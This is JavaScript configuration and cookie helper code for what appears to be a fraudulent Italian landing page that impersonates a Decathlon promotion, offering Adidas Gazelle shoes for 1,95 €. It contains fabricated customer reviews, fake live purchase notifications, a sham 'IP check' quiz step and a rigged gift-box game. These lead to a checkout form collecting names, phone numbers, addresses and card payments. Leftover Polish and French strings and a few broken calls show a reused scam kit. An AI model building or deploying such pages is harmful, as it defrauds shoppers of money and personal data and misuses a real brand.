const orderHref = window.__order_href;
const orderOriginParam = window.__origin_param;

(function (exp) {
  const countryCode = "IT";
  const lang = "it-IT";
  const locale = lang;

  const sizes = {
    enabled: true,
    selectText: "Taille: ",
    arr: [
      "EU 36",
      "EU 37",
      "EU 37.5",
      "EU 38",
      "EU 38.5",
      "EU 39",
      "EU 39.5",
      "EU 40",
      "EU 40.5",
      "EU 41",
      "EU 41.5",
      "EU 42",
      "EU 42.5",
      "EU 43",
      "EU 43.5",
      "EU 44",
      "EU 44.5",
      "EU 45",
      "EU 45.5",
      "EU 46",
      "EU 46.5",
      "EU 47",
      "EU 47.5",
      "EU 48",
      "EU 49",
      "EU 50",
      "EU 51",
      "EU 52",
    ],
  };

  const mainProduct = {
    header: "Offerta limitata",
    name: "Adidas Gazelle",
    oldPrice: "120,00 €",
    newPrice: "1,95 €",
    selectText: "Colore: ",
    text: `
    ¡Congratulazioni!
    <br><br>
    Hai partecipato alla promozione di Decathlon e hai la possibilità di acquistare le scarpe Adidas Gazelle per soli <b>1,95 euro</b>!
    <br><br>
    Affrettati a ottenere le Adidas Gazelle mentre la promozione è ancora valida! Le quantità sono limitate a 100 set!
    <br><br>
  `,
  };


  const notifications = [
    {
      user: "Zofia S*****",
      location: "Milana, Italia",
      action: "Ho appena comprato delle scarpe da ginnastica per 1,95 €!",
      timeago: "przed 15 sekundami",
    },
    {
      user: "Helena B******",
      location: "Napoli, Italia",
      action: "Ho appena comprato delle scarpe da ginnastica per 1,95 €!",
      timeago: "przed 25 sekundami",
    },
  ];

  const reviewsArr = [
    {
      name: "Olivia",
      time: "1 giorno fa",
      header: "Comfort e stile perfetti!",
      product: "HQ6448",
      review:
        "Sono semplicemente innamorato delle mie nuove scarpe da ginnastica Adidas Gazelle! Sono molto confortevoli ed eleganti. Li ho acquistati per l'estate e sono molto soddisfatto. La consegna è stata veloce e l'articolo è arrivato in perfette condizioni.",
    },
    {
      name: "Terry",
      time: "2 giorni fa",
      header: "Un sogno diventato realtà!",
      product: "MR530EMB",
      review:
        "Le scarpe Adidas Gazelle sono un sogno diventato realtà! La qualità è incredibile e si adattano perfettamente ai miei piedi. La combinazione di stile e comfort è perfetta. Sono ideali per l'uso quotidiano o anche per un look più casual. Li raccomando vivamente!",
    },
    {
      name: "Cataleya",
      time: "3 giorni fa",
      header: "Supporto ideale per gli sportivi!",
      product: "MR530EMB",
      review:
        "Ho comprato le scarpe da ginnastica Adidas Gazelle da indossare in palestra e sono fantastiche! Oltre ad essere leggeri, forniscono il supporto ideale per i piedi stanchi. La suola è antiscivolo, ideale per evitare scivolamenti. Sono molto soddisfatto del mio acquisto!",
    },
    {
      name: "Melissa",
      time: "5 giorni fa",
      header: "Un tocco di stile irresistibile!",
      product: "HQ6448",
      review:
        "Queste sneakers Adidas Gazelle sono sicuramente un must per gli amanti della moda. Aggiungeranno un tocco di stile a qualsiasi look quotidiano. Inoltre, la qualità è eccellente e durevole. Sono completamente soddisfatto della mia scelta!",
    },
    {
      name: "Sylvie",
      time: "8 giorni fa",
      header: "Lusso per i piedi!",
      product: "MR530EMB",
      review:
        "Lo consiglio a chiunque voglia qualcosa di speciale nella propria collezione di scarpe!",
    },
  ];

  const reviews = {
    reviews: reviewsArr,
    rr: "RECENSIONI E VALUTAZIONI",
    percent: "99%",
    rec: "Consiglia questo prodotto",
  };

  const questions = {
    _of: "Domanda {1}/{2}:",
    arr: [
      {
        q: "Hai mai acquistato prodotti da Decathlon?",
        a: ["SÌ", "Questo è il mio primo acquisto"],
      },
      {
        q: "Per chi sono queste scarpe sportive?",
        a: [
          "Per me",
          "Per il mio amico",
          "Per un membro della mia famiglia",
        ],
      },
      {
        q: "Consiglieresti i nostri prodotti ai tuoi amici?",
        a: ["SÌ", "NO"],
      },
    ],
  };

  const check = {
    title: "La tua risposta verrà controllata...",
    arr: [
      "Hai risposto alla domanda 3/3.",
      "Il tuo indirizzo IP non ci consente di trarre conclusioni su richieste precedenti.",
      "La tua risposta è stata controllata.",
    ],
  };

  const modals = {
    welcome: {
      texts: {
        header: "Congratulazioni, hai confermato con successo la tua partecipazione alla promozione.",
        button: "OK",
        text: `
      <center>
      Oggi, {date}, è la tua occasione per acquistare un paio di scarpe Adidas Gazelle.
        <br><br>
        Devi solo scegliere la scatola regalo corretta.
        <br><br>
     Hai 3 tentativi, buona fortuna!
      </center>
    `,
      },
    },
    first: {
      texts: {
        header: "Oh no...",
        button: "OK",
        text: `
      <center>
      Spiacenti, questa scatola regalo è vuota! Hai altri 2 tentativi, buona fortuna!
      </center>
    `,
      },
    },
    win: {
      texts: {
        header: "Congratulazioni, hai vinto!",
        button: "OK",
        text: `
      <center>
        <p style="color: #000">
         Hai vinto le scarpe da ginnastica Adidas Gazelle.
        </p>
        <br>
          1) Fai clic su "OK" per accedere alla pagina di spedizione.
          <br><br>
          2) Completa il modulo e paga per ricevere le tue scarpe.
          <br><br>
          3) Il tuo ordine sarà consegnato in 5-6 giorni.
      </center>
    `,
      },
    },
  };
  const cartSteps = {
    personal: {
      title: "Informazione personale",
      fields: {
        name: {
          field: "Nome",
        },
        family: {
          field: "Cognome",
        },
        phone: {
          field: "Numero di telefono",
        },
        email: {
          field: "E-Mail",
        },
      },
    },
    delivery: {
      title: "Consegna",
      fields: {
        city: {
          field: "Città",
        },
        address: {
          field: "Indirizzo di consegna",
        },
        zip: {
          field: "Codice postale",
        },
      },
    },
    payment: {
      title: "Metodo di pagamento",
      creditCard: "Pagamento online con carta di credito",
    },
  };

  const cart = {
    steps: cartSteps,
    main: {
      title: "Riepilogo dell'ordine",
      oldPrice: "120,00 €",
      newPrice: "1,95 €",
      size: "Misurare",
      subTotal: {
        title: "Costo dell'ordine",
        amount: "1,95 €",
      },
      delivery: {
        title: "Consegna",
        amount: "0.00 €",
      },
      total: {
        title: "Totale",
        amount: "1,95 €",
      },
      checkoutButton: "Paga il tuo ordine",
    },
  };


  const productDesc = `

  
  `;

  const products = [
    {
      id: "MR530EMB",
      name: "Collegiate Green / Cloud White / Gum",
      miniImg: "./assets/grw_1.jpg",
      images: [
        "./assets/grw_1.jpg",
        "./assets/grw_2.jpg",
        "./assets/grw_3.jpg",
        "./assets/grw_4.jpg",
        // "./assets/grw_5.jpg",
      ],
    },
    {
      id: "MR530SG",
      name: "Arctic Fusion / Off White / Cream White",
      miniImg: "./assets/BL_1.jpg",
      images: [
        "./assets/gaselle_blue_gif3.gif",
        "./assets/BL_1.jpg",
        "./assets/BL_2.jpg",
        "./assets/BL_3.jpg",
        "./assets/BL_4.jpg",
        "./assets/BL_6.jpg",
        "./assets/BL_7.jpg",
      ],
    },
    {
      id: "MR530SMT",
      name: "Power Red / White / Gold Metallic",
      miniImg: "./assets/RW_1.jpg",
      images: [
        "./assets/RW_1.jpg",
        "./assets/RW_2.jpg",
        "./assets/RW_3.jpg",
        "./assets/RW_4.jpg",
        "./assets/RW_5.jpg",
        "./assets/RW_6.jpg",
      ],
    },

    {
      id: "MR530SMK",
      name: "Cloud White / Cloud White / Gold Metallic",
      miniImg: "./assets/W_1.jpg",
      images: [
        "./assets/W_1.jpg",
        "./assets/W_2.jpg",
        "./assets/W_3.jpg",
        "./assets/W_4.jpg",
        "./assets/W_5.jpg",
        "./assets/W_6.jpg",
      ],
    },
    {
      id: "MR530EMA",
      name: "Core Black / Core Black / Core Black",
      miniImg: "./assets/BLC_1.jpg",
      images: [
        "./assets/BLC_1.jpg",
        "./assets/BLC_2.jpg",
        "./assets/BLC_3.jpg",
        "./assets/BLC_4.jpg",
        "./assets/BLC_5.jpg",
        "./assets/BLC_6.jpg",
      ],
    },
    {
      id: "MR530EMC",
      name: "Collegiate Green / Hazy Sky / Victory Gold",
      miniImg: "./assets/grb_1.jpg",
      images: [
        "./assets/grb_1.jpg",
        "./assets/grb_2.jpeg",
        "./assets/grb_3.jpeg",
        "./assets/grb_4.jpeg",
        "./assets/grb_5.jpeg",
      ],
    },
    {
      id: "MR530EMD",
      name: "Easy Orange / Clear Mint / Gum",
      miniImg: "./assets/or_1.jpg",
      images: [
        "./assets/or_1.jpg",
        "./assets/or_2.jpeg",
        "./assets/or_3.jpeg",
        "./assets/or_4.jpeg",
        "./assets/or_5.jpeg",
      ],
    },
    {
      id: "MR530EME",
      name: "Semi Court Green / Almost Yellow / Gum",
      miniImg: "./assets/lgr_1.jpg",
      images: [
        "./assets/lgr_1.jpg",
        "./assets/lgr_3.jpeg",
        "./assets/lgr_4.jpeg",
        "./assets/lgr_5.jpeg",
      ],
    },
    {
      id: "MR530EMF",
      name: "Legend Ink / Wonder Beige / Gum",
      miniImg: "./assets/lbl_1.jpg",
      images: [
        "./assets/lbl_1.jpg",
        "./assets/lbl_2.jpeg",
        "./assets/lbl_3.jpeg",
        "./assets/lbl_4.jpeg",
        "./assets/lbl_5.jpeg",
      ],
    },
    {
      id: "MR530EMH",
      name: "Cream White / Collegiate Green / Gum",
      miniImg: "./assets/wh_1.jpg",
      images: [
        "./assets/wh_1.jpg",
        "./assets/wh_2.jpeg",
        "./assets/wh_3.jpeg",
        "./assets/wh_4.jpeg",
        "./assets/wh_5.jpeg",
      ],
    },
  ];

  const footer = {
    cr: "© 2024 Decathlon. Tous droits réservés.",
  };

  const pathImgBox = {
    lid: "./assets/box-lid.png",
    lidIOs: "./assets/box-lid-ios.png",
    inner: "./assets/box-inner.png",
    innerGift: "./assets/box-inner-gift.png",
    box: "./assets/box.png",
    boxModal: "./assets/box-modal.png",
  };

  exp.__config = {
    pathImgBox,
    countryCode,
    lang,
    locale,
    mainProduct,
    footer,
    check,
    questions,
    modals,
    cart,
    reviews,
    products,
    sizes,
    notifications,
  };
})(window);


const siteKey = "gazelle-it";

function setCookie(name, value, days = 30) {
  const expires = new Date(Date.now() + days * 864e5).toUTCString();
  document.cookie = `${siteKey + name}=${encodeURIComponent(value)}; expires=${expires}; path=/`;
}

function getCookie(name) {
  var dc = document.cookie;
  var prefix = (siteKey + name) + "=";
  var begin = dc.indexOf("; " + prefix);
  if (begin == -1) {
    begin = dc.indexOf(prefix);
    if (begin != 0) return null;
  }
  else {
    begin += 2;
    var end = document.cookie.indexOf(";", begin);
    if (end == -1) {
      end = dc.length;
    }
  }
  return decodeURI(dc.substring(begin + prefix.length, end));
}

const clearAllCookies = () => document.cookie.split(';').forEach(c => document.cookie = c.replace(/^ +/, '').replace(/=.*/, `=;expires=${new Date().toUTCString()};path=/`));

const clearSiteSpecificCookies = () => {
  document.cookie.split(';').forEach(cookie => {
    // Trim any leading spaces from the cookie string
    const trimmedCookie = cookie.trim();

    // Extract the cookie name
    const cookieName = trimmedCookie.split('=')[0];

    // Check if the cookie name starts with the siteKey
    if (cookieName.startsWith(siteKey)) {
      // Set the cookie's expiration to a past date to delete it
      document.cookie = `${cookieName}=;expires=Thu, 01 Jan 1970 00:00:00 UTC;path=/`;
    }
  });
};


const starupCheck = () => {
  if (getCookie("__firstStart") != null) {
    return;
  } else {
    localStorage.clear();
    clearSiteSpecificCookies();
    setCookie("__firstStart", true);
  }
};


window.addEventListener("load", () => {
  starupCheck;
  for (let path of Object.values(window.__config.pathImgBox)) {
    let link = document.createElement("link");
    link.setAttribute("as", "image");
    link.setAttribute("href", path);
    link.rel = "preload";
    document.head.appendChild(link);
  }
});

const lsSelectProduct = (val) =>
  setCookie("__selected_product", val);
const lsGetSelectedProduct = () => {
  const products = window.__config.products;
  let ind = getCookie("__selected_product");

  if (ind == null) {
    ind = products[1].id;
    lsSelectProduct(ind);
  }

  return products.find((pr) => pr.id === ind);
};
const lsGetSelectedProductInd = () => {
  return lsGetSelectedProduct().id;
};

const lsSelectSize = (val) => setCookie("__selected_size", val);
const lsGetSelectedSizeInd = () => {
  const ind = getCookie("__selected_size");
  let v = parseInt(ind);

  if (isNaN(v)) {
    v = 0;
    lsSelectSize(v);
  }

  return v;
};
const lsGetSelectedSize = () => {
  const sizes = window.__config.sizes;

  return sizes.arr?.[lsGetSelectedSizeInd()];
};

const lsGetProductImages = () => {
  return lsGetSelectedProduct()?.images ?? [];
};

const lsSetStep = (val) => setCookie("__step", val);
const lsGetStep = () => {
  const step = getCookie("__step", val);

  console.log(step);

  if (step != null) return step;

  lsSetStep("main");
  return "main";
};

const getProductById = (id) => {
  const products = window.__config.products;

  return products.find((pr) => pr.id === id);
};

const enableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: flex");
};
const disableLoader = () => {
  const loader = document.querySelector(".loader");
  loader.setAttribute("style", "display: none");
};

const openMain = () => {
  document.querySelector("#main").setAttribute("style", "display: block");
};
const closeMain = () => {
  document.querySelector("#main").setAttribute("style", "display: none");
};

const openGame = () => {
  document.querySelector("#game").setAttribute("style", "display: block");
};
const closeGame = () => {
  document.querySelector("#game").setAttribute("style", "display: none");
};

const openCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: block");
};
const closeCheckout = () => {
  document.querySelector("#checkout").setAttribute("style", "display: none");
};
